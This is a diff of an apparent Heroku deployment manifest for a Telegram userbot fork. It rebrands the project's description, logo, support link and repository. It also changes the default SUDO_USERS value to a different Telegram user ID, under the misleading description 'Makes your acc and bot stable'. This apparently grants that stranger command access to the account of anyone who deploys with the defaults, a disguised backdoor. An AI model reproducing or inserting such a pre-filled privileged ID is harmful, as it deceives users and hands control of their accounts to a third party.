@@ -1,7 +1,7 @@
 {
   "name": "X-tra Telegram",
-  "description": "Userbot created by a SNAPDRAGON and custom fork by ANUBIS\n\n join https://t.me/X_tra_tele_support for any problems or support",
-  "logo": "https://telegra.ph/file/1be6c59f53fef57b5745b.jpg",
+  "description": "join https://t.me/thedemonhub for any problems or support",
+  "logo": "https://telegra.ph/file/a87a291f882a8c170ae2c.jpg",
   "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/Dark-Princ3/X-tra-Telegram/",
+  "repository": "https://github.com/TheDemonHuB/DemonBoT",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -56,7 +56,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "742506768",
+      "value": "715462063",
       "required": false
     },
     "HEROKU_APP_NAME": {
